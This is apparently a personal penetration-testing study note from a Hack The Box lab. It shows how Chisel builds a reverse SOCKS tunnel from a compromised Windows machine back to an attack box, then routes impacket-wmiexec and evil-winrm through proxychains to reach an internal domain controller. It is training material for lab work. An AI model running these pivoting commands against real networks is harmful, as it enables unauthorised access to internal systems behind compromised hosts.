- [Chisel](https://github.com/jpillora/chisel) Download here
- Tunneling tool, lets us route our traffic through a compromised machine to reach hosts we can't connect to directly
- Useful when our attack box has no direct route to a target (e.g. a DC only reachable from an internal machine we've already compromised)

---
## Setup (reverse tunnel - our box is the server, compromised box is the client)
On our attack box:
```bash
sudo ./chisel server --reverse
```
On the compromised machine (the one with access to the target network):
```cmd
# This example for Windows compromised machine
chisel.exe client <our-ip>:8080 R:socks
```
- `R:socks` = sets up a SOCKS proxy on our end, tunneled through the compromised box

---
## Using the tunnel
- Happen in our attack box
- Point `proxychains` at the SOCKS port chisel opened (default 1080), edit `/etc/proxychains.conf`:
```bash
[ProxyList]  
socks5 127.0.0.1 1080
```
- Then run any tool through the tunnel by prefixing it:
```bash
proxychains impacket-wmiexec dc01 -k
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
- Also usually need to edit `/etc/hosts` to hardcode the target's hostname/IP, since our box can't resolve internal DNS on its own

See [[Pass the Ticket (Linux)]] for the full scenario this was used in